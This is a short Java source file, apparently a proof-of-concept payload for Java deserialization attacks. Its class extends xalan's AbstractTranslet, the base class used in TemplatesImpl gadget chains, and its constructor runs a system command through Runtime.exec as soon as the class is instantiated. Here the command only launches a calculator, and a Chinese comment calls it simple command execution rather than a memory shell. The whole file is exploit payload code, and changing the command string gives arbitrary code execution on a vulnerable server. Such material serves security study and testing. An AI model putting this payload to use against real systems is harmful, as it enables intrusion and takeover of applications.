package memoryshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class HelloTemplatesImpl extends AbstractTranslet {
    //不是内存马，就是简单的的Runtime执行命令
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public HelloTemplatesImpl() {
        super();
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{"calc"});
            p.waitFor();
        }catch (Exception e){}

    }
}